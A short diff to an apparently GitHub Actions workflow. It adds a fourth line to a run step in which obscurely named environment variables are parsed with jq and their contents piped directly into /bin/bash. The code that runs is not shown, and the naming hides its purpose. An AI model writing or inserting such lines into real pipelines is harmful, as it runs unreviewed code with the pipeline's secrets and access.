@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$uvt0090" | jq -r .qhz02028 | /bin/bash
           echo $hbesc3180 | jq -r .fvr1534 | /bin/bash
           echo $pmdgw795 | jq -r .k3 | /bin/bash
+          echo $rfc7952 | jq -r .aypcg88007 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
